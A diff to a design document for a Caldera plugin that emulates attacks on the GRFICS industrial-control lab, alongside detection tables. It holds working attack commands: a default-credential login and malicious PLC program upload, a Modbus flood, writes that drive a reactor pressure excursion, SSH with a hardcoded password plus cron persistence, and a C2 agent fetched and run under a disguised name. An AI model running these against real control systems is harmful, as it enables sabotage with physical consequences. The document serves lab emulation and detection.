@@ -61,13 +61,28 @@ Default setpoints: product_flow=13107, a_setpoint=30801, pressure_sp=55295, over
 
 7. **GRFICS Caldera plugin alignment**: Abilities under `plugins/modbus` match the GRFICS-patched OpenPLC `webserver.py` routes and SCADA-LTS Spring Security behavior. Login abilities write session jars **`/tmp/plc_cookies.txt`** and **`/tmp/hmi_cookies.txt`** for reuse by dependent steps in the same operation.
 
+**Source tree**: The maintained plugin lives in **`GRFICSv3/caldera/plugins/modbus/`** (abilities: `data/abilities/**/*.yml`; adversaries: `data/adversaries/*.yml`). Mount or copy this tree into the Caldera container (or rebuild the `fortiphyd/grfics-caldera` image) after edits so the server loads updated definitions.
+
+### Reliability fixes (Caldera reports vs live GRFICS)
+
+Operations that failed or timed out in early all-chain runs were addressed in the plugin as follows:
+
+| Area | Symptom | Change |
+|------|---------|--------|
+| **OpenPLC upload** | Empty `PARSED_ST_FILENAME` / upload appeared to succeed | Unauthenticated POST returns a **login** page (no `NNNNN.st`). Upload abilities **`POST /login`** first (refresh session), parse assigned names with **`grep -oE '[0-9]+[.]st'`**. **OpenPLC – Default Credential Access** exits **`1`** if the dashboard check fails (no silent `LOGIN_FAILED` with exit 0). |
+| **EWS + Caldera `modbus_cli`** | `GLIBC_2.x not found` when running the PyInstaller binary on EWS | **Chain 11** abilities **`a9b8c7d6-…-000000000003` through `…000000000005`** run **Modbus TCP** from the EWS using **`python3`** and **stdlib** only (`socket` / `struct`), via **`printf '…' \| ssh … 'python3 -'`**. SCP of `modbus_cli` to EWS remains in the story line for **lateral tool transfer** but is not required for those remote steps. |
+| **Chain 5 — I/O collection** | Exit 255 / truncated output when the first PLC read failed | **`e5f6a7b8-…-000000000003`** uses **`set +e`**, resolves **`./modbus_cli`**, samples PLC HR/IR plus field devices, **`timeout: 180`**. |
+| **Chain 6 — DoS flood** | Caldera status **124** (executor timeout) | **`f6a7b8c9-…-000000000004`** uses a **smaller** read loop per IP and **`timeout: 300`**. |
+| **Chain 13 — Sandcat on EWS** | Timeout **124** while download/agent still progressing | **`a9b8c7d6-…-000000000007`** adds **`ConnectTimeout`**, bounded **`curl`** (`--connect-timeout`, `--max-time`), shorter remote follow-up, **`timeout: 300`**. |
+
 ### GRFICS OpenPLC and SCADA-LTS HTTP semantics
 
-- **OpenPLC login**: `POST /login` with `username` and `password`; success is validated with `GET /dashboard` (grep for dashboard/OpenPLC/Programs/Running/Stopped), not by parsing mixed stdout from `curl -w`.
+- **OpenPLC login**: `POST /login` with `username` and `password`; success is validated with `GET /dashboard` (grep for dashboard/OpenPLC/Programs/Running/Stopped), not by parsing mixed stdout from `curl -w`. On failure, the ability **must exit non-zero** so dependent upload steps are not run without a session.
 - **Program listing / collection**: Stock GRFICS OpenPLC does **not** expose `GET /get-program-body`. Collection abilities use **`GET /programs`** (authenticated HTML) and parse `*.st` names for reconnaissance; raw `.st` download is operator/UI-centric.
 - **Program upload (two steps)**:
-  1. `POST /upload-program` with multipart field `file=@...` — the server stores `st_files/<random>.st` and returns HTML containing the assigned filename.
+  1. `POST /upload-program` with multipart field `file=@...` — the server stores `st_files/<random>.st` and returns HTML containing the assigned filename (visible in `value='...st'` / hidden `prog_file`).
   2. `POST /upload-program-action` with `prog_name`, `prog_descr`, `prog_file` (the server-assigned `*.st`), and `epoch_time`.
+  Abilities parse the assigned name with **`grep -oE '[0-9]+[.]st'`** (portable in `sh`; avoid over-escaped `\.` in nested quotes). Upload abilities also **re-POST `/login`** when needed so `/tmp/plc_cookies.txt` is valid.
   Follow-on compile/start abilities read the assigned ST name from **`/tmp/plc_last_st_file.txt`** (written by upload abilities).
 - **Compile / run / stop**: **`GET /compile-program?file=<name>`**, **`GET /start_plc`**, **`GET /stop_plc`** (underscores; not `start-plc`, `stop-plc`, or `compile-program?program_name=` alone).
 - **Program deletion**: **`GET /remove-program?id=<Prog_ID>`** — numeric IDs are parsed from `remove-program?id=` links on `/programs` (not a `POST` with `program_name=`).
@@ -421,8 +436,11 @@ This prevents the PLC's `pressure_override` function from activating (it trigger
       curl -s -b /tmp/plc_cookies.txt
       "http://192.168.95.2:8080/dashboard"
       -o /tmp/plc_dash.html &&
-      grep -qi "dashboard\|OpenPLC\|Programs\|Running\|Stopped" /tmp/plc_dash.html &&
-      echo "LOGIN_SUCCESS" || echo "LOGIN_FAILED"
+      if ! grep -qi "dashboard\|OpenPLC\|Programs\|Running\|Stopped" /tmp/plc_dash.html; then
+        echo "LOGIN_FAILED" >&2
+        exit 1
+      fi &&
+      echo "LOGIN_SUCCESS"
     timeout: 60
 ```
 
@@ -496,10 +514,12 @@ This prevents the PLC's `pressure_override` function from activating (it trigger
       printf '  END_RESOURCE\n' >> /tmp/malicious.st &&
       printf 'END_CONFIGURATION\n' >> /tmp/malicious.st &&
       echo "ST file bytes:" && wc -c /tmp/malicious.st &&
+      curl -s -c /tmp/plc_cookies.txt -d "username=openplc&password=openplc"
+      "http://192.168.95.2:8080/login" -o /dev/null &&
       curl -s -b /tmp/plc_cookies.txt -F "file=@/tmp/malicious.st"
       "http://192.168.95.2:8080/upload-program"
       -o /tmp/plc_upload_form.html &&
-      FN=$(grep -oE '[0-9]+\.st' /tmp/plc_upload_form.html | head -1) &&
+      FN=$(grep -oE '[0-9]+[.]st' /tmp/plc_upload_form.html | head -1) &&
       echo "PARSED_ST_FILENAME=$FN" &&
       test -n "$FN" &&
       curl -s -b /tmp/plc_cookies.txt -X POST "http://192.168.95.2:8080/upload-program-action"
@@ -532,7 +552,7 @@ This prevents the PLC's `pressure_override` function from activating (it trigger
     command: >
       FN=$(cat /tmp/plc_last_st_file.txt 2>/dev/null) &&
       if [ -z "$FN" ]; then
-        FN=$(grep -oE '[0-9]+\.st' /tmp/plc_upload_form.html 2>/dev/null | head -1);
+        FN=$(grep -oE '[0-9]+[.]st' /tmp/plc_upload_form.html 2>/dev/null | head -1);
       fi &&
       echo "COMPILE_FILE=$FN" &&
       test -n "$FN" &&
@@ -614,10 +634,12 @@ After uploading the malicious program, a realistic persistence pattern is to **r
     name: sh
     command: >
       test -f /tmp/malicious.st || { echo "MISSING_/tmp/malicious.st"; exit 1; } &&
+      curl -s -c /tmp/plc_cookies.txt -d "username=openplc&password=openplc"
+      "http://192.168.95.2:8080/login" -o /dev/null &&
       curl -s -b /tmp/plc_cookies.txt -F "file=@/tmp/malicious.st"
       "http://192.168.95.2:8080/upload-program"
       -o /tmp/plc_persist_form.html &&
-      FN=$(grep -oE '[0-9]+\.st' /tmp/plc_persist_form.html | head -1) &&
+      FN=$(grep -oE '[0-9]+[.]st' /tmp/plc_persist_form.html | head -1) &&
       test -n "$FN" &&
       curl -s -b /tmp/plc_cookies.txt -X POST "http://192.168.95.2:8080/upload-program-action"
       -d "prog_name=persist_reup"
@@ -1121,9 +1143,9 @@ For each attack chain, the following detection rules should be developed:
 | 3 | Remote Services | T0886 | Lateral Movement | Deploy Caldera Sandcat agent on EWS from VNC session | C2 channel from ICS network host |
 | 4 | Command-Line Interface | T0807 | Execution | Open terminal, run `ip a`, `netstat -ant`, `route -n` | Enumerate network from ICS-internal position |
 | 5 | Network Connection Enumeration | T0840 | Discovery | `ss -tunap \| grep 502` and `nmap -sT -p502 192.168.95.0/24` | Discover active Modbus connections and servers |
-| 6 | Lateral Tool Transfer | T0867 | Lateral Movement | Download `modbus_cli` from Caldera server to EWS | Attack tooling now on trusted ICS host |
+| 6 | Lateral Tool Transfer | T0867 | Lateral Movement | Download **`modbus_cli`** from Caldera to the **Kali** agent (`./modbus_cli`) | Tooling for ICS-facing Modbus from the DMZ session |
 | 7 | Scripting | T0853 | Execution | Write Python script to automate Modbus reads across all devices | Automated process intelligence gathering |
-| 8 | I/O Image | T0877 | Collection | Read PLC I/O map: `./modbus_cli 192.168.95.2 read_ir 100 13` | Full snapshot of PLC input/output register state |
+| 8 | I/O Image | T0877 | Collection | Scripted sweep: PLC **HR/IR** + field devices via **`modbus_cli`** on **Kali** (resilient `set +e`) | Snapshot of PLC and field I/O over several cycles |
 | 9 | Data from Local System | T0893 | Collection | `find / -name "*.st" -o -name "*.xml" 2>/dev/null` on EWS | Discover PLC project files on engineering workstation |
 | 10 | Manipulate I/O Image | T0835 | Inhibit Response | Write false values to PLC I/O registers from trusted EWS IP | PLC acts on corrupted I/O data; origin appears legitimate |
 | 11 | Standard Application Layer Protocol | T0869 | C2 | Agent beacons over HTTP to `192.168.90.250:8888` via router | C2 traffic blends with normal HTTP |
@@ -1205,27 +1227,35 @@ The **Harvest PLC Project Files** ability only lists `/home/engineer` when the S
 - id: e5f6a7b8-5555-5555-5555-000000000003
   name: Scripted Automated I/O Image Collection
   description: |
-    Shell-based I/O collection instead of inline Python to avoid
-    whitespace mangling by Caldera.
+    Polls PLC holding/input registers and field Modbus devices from the Kali agent.
+    Uses set +e so one failed read does not abort the whole sweep; resolves modbus_cli path.
   tactic: collection
   technique_id: T0877
   technique_name: I/O Image
   executors:
   - platform: linux
     name: sh
-    command: >
-      for cycle in 1 2 3 4 5; do
-        echo "=== Cycle $cycle ===" &&
-        echo "PLC:" && ./modbus_cli 192.168.95.2 --port 502 read_ir 100 13 &&
-        echo "Tank:" && ./modbus_cli 192.168.95.14 --port 502 read_ir 1 2 &&
-        echo "Feed1:" && ./modbus_cli 192.168.95.10 --port 502 read_hr 1 1 &&
-        echo "Purge:" && ./modbus_cli 192.168.95.12 --port 502 read_hr 1 1 &&
-        sleep 5;
-      done &&
+    command: |
+      set +e
+      MC="./modbus_cli"
+      if ! test -x "$MC"; then MC="$(pwd)/modbus_cli"; fi
+      if ! test -x "$MC"; then echo "ERROR: modbus_cli not found"; exit 1; fi
+      for cycle in 1 2 3; do
+        echo "=== Cycle $cycle ==="
+        echo "--- PLC holding registers ---"
+        "$MC" 192.168.95.2 --port 502 read_hr 0 10 || echo "plc_hr_read_failed"
+        echo "--- PLC input registers ---"
+        "$MC" 192.168.95.2 --port 502 read_ir 100 13 || echo "plc_ir_read_failed"
+        echo "--- Field devices ---"
+        "$MC" 192.168.95.10 --port 502 read_ir 1 2 || true
+        "$MC" 192.168.95.14 --port 502 read_ir 1 2 || true
+        sleep 4
+      done
+      set -e
       echo "IO_COLLECTION_COMPLETE"
     payloads:
     - modbus_cli
-    timeout: 120
+    timeout: 180
 ```
 
 **Ability: Manipulate I/O Image from Trusted Source**
@@ -1512,25 +1542,27 @@ Instead of direct Modbus writes, modify the PLC project files on the EWS disk (e
 - id: f6a7b8c9-6666-6666-6666-000000000004
   name: Modbus - Denial of Service Flood
   description: |
-    Flood all Modbus servers with rapid read requests.
-    Uses background processes instead of shell functions.
+    Flood all in-plant Modbus TCP servers with rapid read requests (background jobs).
+    Iteration count reduced vs earlier versions so the ability completes within Caldera timeouts.
   tactic: inhibit-response-function
   technique_id: T0814
   technique_name: Denial of Service
   executors:
   - platform: linux
     name: sh
-    command: >
+    command: |
+      set +e
       for j in 10 11 12 13 14 15; do
-        for i in $(seq 1 200); do
-          ./modbus_cli 192.168.95.$j --port 502 read_ir 1 2 2>/dev/null;
-        done &
-      done &&
-      wait &&
+        for i in $(seq 1 35); do
+          ./modbus_cli "192.168.95.$j" --port 502 read_ir 1 2 2>/dev/null &
+        done
+      done
+      wait
+      set -e
       echo "DOS_FLOOD_COMPLETE"
     payloads:
     - modbus_cli
-    timeout: 120
+    timeout: 300
 ```
 
 **Step 3: Adversary Profile**
@@ -1561,7 +1593,7 @@ atomic_ordering:
 | PLC register read | Suricata | Modbus FC=0x01 (Read Coils) from 192.168.90.6 to 192.168.95.2 | DC0085 (Network Traffic Content) |
 | Rogue parameter writes | Suricata | Modbus FC=0x06 writes from non-PLC source to .10-.13 | DC0082 (Network Connection Creation) |
 | Brute force I/O | Suricata, Simulation supervisor | Burst of 800+ Modbus writes in <30 seconds; random register values | DC0085 (Network Traffic Content) |
-| DoS flood | Suricata | >1000 Modbus reads/sec from single source; connection timeouts | DC0078 (Network Traffic Flow) |
+| DoS flood | Suricata | Burst of rapid Modbus reads from single source (load scaled to finish within executor timeout) | DC0078 (Network Traffic Flow) |
 | Process chaos | Simulation process_alarms, supervisor | Valve positions oscillating wildly, pressure/level unstable | DC0109 (Process/Event Alarm) |
 | PLC stale reads | PLC plc_app logs | PLC Modbus master timeouts or read failures | DC0108 (Device Alarm) |
 
@@ -2185,6 +2217,8 @@ Instead of blocking all traffic, only block Modbus writes (FC 0x06, 0x10) while 
   - platform: linux
     name: sh
     command: >
+      curl -s -c /tmp/plc_cookies.txt -d "username=openplc&password=openplc"
+      "http://192.168.95.2:8080/login" -o /dev/null &&
       printf 'PROGRAM main1\n' > /tmp/326339.st &&
       printf '  VAR\n' >> /tmp/326339.st &&
       printf '    f1_valve_sp AT %%QW100 : UINT;\n' >> /tmp/326339.st &&
@@ -2208,7 +2242,7 @@ Instead of blocking all traffic, only block Modbus writes (FC 0x06, 0x10) while 
       curl -s -b /tmp/plc_cookies.txt -F "file=@/tmp/326339.st"
       "http://192.168.95.2:8080/upload-program"
       -o /tmp/plc_upload_form_masq.html &&
-      FN=$(grep -oE '[0-9]+\.st' /tmp/plc_upload_form_masq.html | head -1) &&
+      FN=$(grep -oE '[0-9]+[.]st' /tmp/plc_upload_form_masq.html | head -1) &&
       echo "PARSED_ST_FILENAME=$FN" &&
       test -n "$FN" &&
       curl -s -b /tmp/plc_cookies.txt -X POST "http://192.168.95.2:8080/upload-program-action"
@@ -2388,9 +2422,9 @@ curl -X POST http://localhost:8888/api/v2/operations \
 
 ### Chain 11: SSH Foothold on EWS — Trusted Modbus Execution and Cron Persistence
 
-**Adversary Profile**: Red-team operator with DMZ access only (Kali agent) who obtains **SSH** access to the engineering workstation using **`engineer`** / **`plc123`**, after a short password-guessing phase. The attacker **does not** rely on noVNC (contrast Chain 5). They **SCP** `modbus_cli` onto the EWS, run Modbus reads **remotely over SSH** (so the binary executes **on the EWS** with source IP **192.168.95.5**), then apply sustained pressure excursion writes and install a **cron** job for periodic purge valve manipulation.
+**Adversary Profile**: Red-team operator with DMZ access only (Kali agent) who obtains **SSH** access to the engineering workstation using **`engineer`** / **`plc123`**, after a short password-guessing phase. The attacker **does not** rely on noVNC (contrast Chain 5). They download **`modbus_cli` on Kali**, **SCP** it to **`/tmp/modbus_cli`** on the EWS (lateral tool transfer), then run **Modbus from the EWS** so traffic originates from **192.168.95.5**. **Collection, impact, and cron persistence abilities do not execute that PyInstaller binary on the EWS** (older **glibc** on the workstation image caused runtime failures); they use **`python3`** with **stdlib Modbus TCP** over SSH instead—see ability files below.
 
-**Kill Chain Summary**: DMZ C2 (Kali) → SSH brute simulation → valid SSH session → lateral tool transfer (SCP) → collection (remote execution) → impact (remote Modbus writes from trusted IP) → persistence (cron on EWS)
+**Kill Chain Summary**: DMZ C2 (Kali) → SSH brute simulation → valid SSH session → lateral tool transfer (SCP) → collection (remote **Python** Modbus on EWS) → impact (remote writes) → persistence (**cron** invoking **Python** on EWS)
 
 #### Technique Mapping
 
@@ -2398,10 +2432,10 @@ curl -X POST http://localhost:8888/api/v2/operations \
 |------|---------------|-------------|--------|----------------|--------------------------|
 | 1 | Exploit Public-Facing Application | T0819 | Initial Access | Sandcat on Kali beacons to Caldera | C2 from attacker host |
 | 2 | Exploitation of Remote Services | T0866 | Initial Access | Failed SSH with `wrongpass1` / `wrongpass2`, then success with `plc123` | Realistic auth noise then shell access |
-| 3 | Lateral Tool Transfer | T0867 | Lateral Movement | `scp ./modbus_cli engineer@192.168.95.5:/tmp/` | Modbus tool present on EWS |
-| 4 | Monitor Process State | T0801 | Collection | SSH remote: `/tmp/modbus_cli 192.168.95.14 read_ir 1 2` | Baseline tank pressure/level |
-| 5 | Manipulation of Control | T0831 | Inhibit Response | SSH remote loops: purge HR 0, feed HR 65535 | Pressure excursion |
-| 6 | Remote Services | T0886 | Persistence | `crontab` with periodic `/tmp/modbus_cli ... write_r` | Repeating purge closure every 15 min |
+| 3 | Lateral Tool Transfer | T0867 | Lateral Movement | `scp ./modbus_cli engineer@192.168.95.5:/tmp/` | Modbus tool present on EWS (optional for later manual use) |
+| 4 | Monitor Process State | T0801 | Collection | SSH: pipe **Python 3** script to `python3 -` on EWS (**FC4** read Tank IRs) | Baseline tank pressure/level |
+| 5 | Manipulation of Control | T0831 | Inhibit Response | SSH: **Python 3** loop (**FC6** writes) — purge HR 0, feed HR 65535 | Pressure excursion |
+| 6 | Remote Services | T0886 | Persistence | `crontab` runs **`/usr/bin/python3 /tmp/ews_cron_mb.py`** every 15 min | Repeating purge closure |
 
 #### Caldera Implementation
 
@@ -2473,83 +2507,23 @@ curl -X POST http://localhost:8888/api/v2/operations \
     timeout: 120
 ```
 
-**Ability: SSH remote — read tank**
+**Ability: SSH remote — read tank** (`a9b8c7d6-1010-1010-1010-000000000003`)
 
-```yaml
----
+**File**: `plugins/modbus/data/abilities/collection/a9b8c7d6-1010-1010-1010-000000000003.yml`
 
-- id: a9b8c7d6-1010-1010-1010-000000000003
-  name: SSH Remote Execution - Read Tank Process State via EWS
-  description: |
-    Executes /tmp/modbus_cli on the EWS over SSH to read Tank IRs (trusted ICS source IP .5).
-  tactic: collection
-  technique_id: T0801
-  technique_name: Monitor Process State
-  executors:
-  - platform: linux
-    name: sh
-    command: >
-      command -v sshpass >/dev/null 2>&1 || { echo "ERROR: sshpass required"; exit 1; } &&
-      sshpass -p 'plc123' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null
-      engineer@192.168.95.5
-      '/tmp/modbus_cli 192.168.95.14 --port 502 read_ir 1 2' &&
-      echo "EWS_REMOTE_READ_DONE"
-    timeout: 60
-```
+Runs **`printf '…' | ssh … engineer@192.168.95.5 'python3 -'`** so a short **Python 3** program on the EWS performs **Modbus TCP FC4** (read input registers) against the Tank device (**192.168.95.14:502**). This avoids executing the Caldera **modbus_cli** PyInstaller binary on the EWS (GLIBC mismatch vs Kali). Ends with **`EWS_REMOTE_READ_DONE`**. **`timeout: 90`**.
 
-**Ability: SSH remote — pressure excursion**
+**Ability: SSH remote — pressure excursion** (`a9b8c7d6-1010-1010-1010-000000000004`)
 
-```yaml
----
+**File**: `plugins/modbus/data/abilities/impact/a9b8c7d6-1010-1010-1010-000000000004.yml`
 
-- id: a9b8c7d6-1010-1010-1010-000000000004
-  name: SSH Remote Execution - Modbus Pressure Excursion from EWS
-  description: |
-    From EWS over SSH, runs modbus_cli against Purge and Feed 1 to close purge and open feed,
-    causing reactor pressure to rise. Traffic originates from trusted EWS IP (192.168.95.5).
-  tactic: impact
-  technique_id: T0831
-  technique_name: Manipulation of Control
-  executors:
-  - platform: linux
-    name: sh
-    command: >
-      command -v sshpass >/dev/null 2>&1 || { echo "ERROR: sshpass required"; exit 1; } &&
-      sshpass -p 'plc123' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null
-      engineer@192.168.95.5
-      'for i in $(seq 1 40); do
-      /tmp/modbus_cli 192.168.95.12 --port 502 write_r 1 0;
-      /tmp/modbus_cli 192.168.95.10 --port 502 write_r 1 65535;
-      sleep 0.1;
-      done' &&
-      echo "EWS_REMOTE_WRITE_IMPACT_DONE"
-    timeout: 120
-```
+Uses **`printf` with a multi-line Python script** piped to **`python3 -`** on the EWS: loop of **FC6** writes to Purge (.12) and Feed 1 (.10). **`timeout: 180`**.
 
-**Ability: Cron persistence on EWS**
+**Ability: Cron persistence on EWS** (`a9b8c7d6-1010-1010-1010-000000000005`)
 
-```yaml
----
+**File**: `plugins/modbus/data/abilities/lateral-movement/a9b8c7d6-1010-1010-1010-000000000005.yml`
 
-- id: a9b8c7d6-1010-1010-1010-000000000005
-  name: SSH - Install crontab on EWS for periodic Modbus write
-  description: |
-    Replaces user crontab on engineer@EWS with a periodic job that writes purge valve HR.
-    Lab-only persistence; replaces existing crontab for the engineer user.
-  tactic: lateral-movement
-  technique_id: T0886
-  technique_name: Remote Services
-  executors:
-  - platform: linux
-    name: sh
-    command: >
-      command -v sshpass >/dev/null 2>&1 || { echo "ERROR: sshpass required"; exit 1; } &&
-      sshpass -p 'plc123' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null
-      engineer@192.168.95.5
-      'echo "*/15 * * * * /tmp/modbus_cli 192.168.95.12 --port 502 write_r 1 0 2>/dev/null" | crontab - && crontab -l' &&
-      echo "EWS_CRON_INSTALLED"
-    timeout: 60
-```
+First SSH session pipes a **Python script** to **`/tmp/ews_cron_mb.py`** on the EWS; second session installs **`crontab`** with **`*/15 * * * * /usr/bin/python3 /tmp/ews_cron_mb.py`** (logs to **`/tmp/ews_cron_mb.log`**). **`timeout: 90`**.
 
 **Step 3: Adversary profile**
 
@@ -2609,6 +2583,7 @@ curl -X POST http://localhost:8888/api/v2/operations \
 #### Assumptions
 
 - `sshd` on EWS accepts password auth for `engineer` / `plc123`.
+- **`python3`** is available on the EWS image (stock GRFICS workstation) for stdlib Modbus over SSH.
 - `crontab` replace is acceptable in the lab (restores from snapshot or backup if needed).
 
 ---
@@ -2712,36 +2687,11 @@ atomic_ordering:
 
 #### Caldera Implementation
 
-**Ability: Deploy Sandcat via SSH**
+**Ability: Deploy Sandcat via SSH** (`a9b8c7d6-1010-1010-1010-000000000007`)
 
-```yaml
----
+**File**: `plugins/modbus/data/abilities/initial-access/a9b8c7d6-1010-1010-1010-000000000007.yml`
 
-- id: a9b8c7d6-1010-1010-1010-000000000007
-  name: SSH Remote Execution - Deploy Sandcat on EWS
-  description: |
-    Non-interactive: downloads Sandcat from Caldera (192.168.90.250:8888) on the EWS via SSH
-    and starts it in the background with group ews. Requires prior successful SSH login test
-    (same credentials). Follow with a second Caldera operation targeting group ews.
-  tactic: initial-access
-  technique_id: T0822
-  technique_name: External Remote Services
-  executors:
-  - platform: linux
-    name: sh
-    command: >
-      command -v sshpass >/dev/null 2>&1 || { echo "ERROR: sshpass required"; exit 1; } &&
-      sshpass -p 'plc123' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null
-      engineer@192.168.95.5
-      'SERVER="http://192.168.90.250:8888" &&
-      curl -s -X POST -H "file:sandcat.go" -H "platform:linux" ${SERVER}/file/download > /tmp/splunkd &&
-      chmod +x /tmp/splunkd &&
-      nohup /tmp/splunkd -server ${SERVER} -group ews -v > /tmp/sandcat_ews.log 2>&1 &
-      sleep 2 &&
-      tail -3 /tmp/sandcat_ews.log 2>/dev/null; pgrep -a splunkd || true' &&
-      echo "SANDCAT_DEPLOY_SSH_TRIGGERED"
-    timeout: 120
-```
+Non-interactive: from Kali, **`sshpass`** opens SSH to the EWS and runs **`curl`** against Caldera **`/file/download`**, **`chmod +x`**, **`nohup`** Sandcat in the background (**`-group ews`**). Uses **`-o ConnectTimeout=15`** on SSH, **`curl -S --connect-timeout 20 --max-time 120`**, short **`sleep`** + **`pgrep`**, ends remote with **`echo SANDCAT_REMOTE_START_OK`**. Executor **`timeout: 300`** so Caldera does not kill the step while the binary downloads. Follow with a **second** operation targeting **`group: ews`** once the agent registers.
 
 **Adversary profile**
 
@@ -2781,15 +2731,16 @@ atomic_ordering:
 #### Assumptions
 
 - EWS can reach Caldera at `192.168.90.250:8888` through the router (same as other chains).
+- Caldera executor **timeout** on the deploy ability is **300 s** so slow downloads do not surface as false **124** timeouts.
 
 #### Summary Comparison: SSH Chains 11–13
 
 | Attribute | Chain 11: SSH trusted Modbus + cron | Chain 12: SSH exfil + DMZ Modbus | Chain 13: SSH deploy Sandcat (phase 1) |
 |-----------|--------------------------------------|----------------------------------|----------------------------------------|
 | **Initial Access** | SSH `engineer`@EWS after failed password attempts | Same SSH pattern | Same SSH pattern |
-| **Primary Difference vs Chain 5** | **No noVNC**; non-interactive **sshpass** | Adds **SCP exfil** of `chemical.st` | **No desktop**; pushes agent via **SSH remote curl** |
-| **Modbus Source IP** | **192.168.95.5** (EWS) via remote exec | **192.168.90.6** (Kali) after exfil | Phase 2 (EWS agent) — not in phase-1 profile |
-| **Persistence** | **Cron** on EWS | None in this profile | Sandcat **group ews** (phase 2) |
+| **Primary Difference vs Chain 5** | **No noVNC**; non-interactive **sshpass**; **Python** Modbus on EWS | Adds **SCP exfil** of `chemical.st` | **No desktop**; pushes agent via **SSH remote curl** |
+| **Modbus Source IP** | **192.168.95.5** (EWS) — **Python stdlib** over SSH | **192.168.90.6** (Kali) after exfil | Phase 2 (EWS agent) — not in phase-1 profile |
+| **Persistence** | **Cron** + **`/tmp/ews_cron_mb.py`** on EWS | None in this profile | Sandcat **group ews** (phase 2) |
 | **High-Value Telemetry** | auth.log + Modbus from .5 | auth.log + file read + Modbus from .6 | auth.log + HTTP beacon **from .5** to Caldera |
 
 ---
